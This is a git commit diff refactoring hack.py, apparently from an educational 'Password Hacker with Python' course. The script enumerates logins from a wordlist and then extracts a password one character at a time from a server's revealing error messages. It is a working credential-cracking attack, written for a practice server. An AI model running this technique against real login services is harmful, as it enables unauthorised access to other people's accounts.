61f27548b9f1b3524db5d0bb3f08c739fffb9275
Akshit Mehta <157466686+BriskAM@users.noreply.github.com>
2024-03-13 22:40:09 +0530

    refactored

--- Password Hacker with Python/task/hacking/hack.py
+++ Password Hacker with Python/task/hacking/hack.py
@@ -12,43 +12,45 @@ def file_line_iterator(filename):
 host, port = sys.argv[1:]
 address = (host, int(port))
 
-with socket.socket() as sock:
-    sock.connect(address)
-    login_list = file_line_iterator(
-        filename="/Users/akshitmehta/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/Step.txt")
-    found = False
-    request_exceeded = False
+try:
+    with socket.socket() as sock:
+        sock.connect(address)
+        login_list = file_line_iterator("/Users/akshitmehta/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/Step.txt")
+        found = False
 
-    try:
-        username = None
-        for login in login_list:
-            credentials = json.dumps({"login": login, "password": "asoiaf"})
-            sock.send(credentials.encode())
-            response = json.loads(sock.recv(1024).decode())
-            if response["result"] == "Wrong password!":
-                username = login
-                break
-        password = ''
-        while True:
-            found = False
-            for ascii_code in range(128):
-                passw = password + chr(ascii_code)
-                credentials = json.dumps({"login": username, "password": passw})
+        try:
+            username = None
+            for login in login_list:
+                credentials = json.dumps({"login": login, "password": "asoiaf"})
                 sock.send(credentials.encode())
                 response = json.loads(sock.recv(1024).decode())
-                if response["result"] == "Exception happened during login":
-                    password += chr(ascii_code)
+                if response["result"] == "Wrong password!":
+                    username = login
                     break
-                elif response["result"] == "Connection success!":
-                    found = True
+            password = ''
+            while True:
+                found = False
+                for ascii_code in range(128):
+                    passw = password + chr(ascii_code)
+                    credentials = json.dumps({"login": username, "password": passw})
+                    sock.send(credentials.encode())
+                    response = json.loads(sock.recv(1024).decode())
+                    if response["result"] == "Exception happened during login":
+                        password += chr(ascii_code)
+                        break
+                    elif response["result"] == "Connection success!":
+                        found = True
+                        break
+                if found:
                     break
-            if found:
-                break
-        credentials = {"login": username, "password": password}
-        print(json.dumps(credentials))
+            credentials = {"login": username, "password": password}
+            print(json.dumps(credentials))
 
-    except StopIteration:
-        pass
+        except StopIteration:
+            pass
 
-    if not found:
-        print("Too many attempts or incorrect host/port.")
+        if not found:
+            print("Too many attempts or incorrect host/port.")
+
+except Exception as e:
+    print(f"An error occurred: {e}")
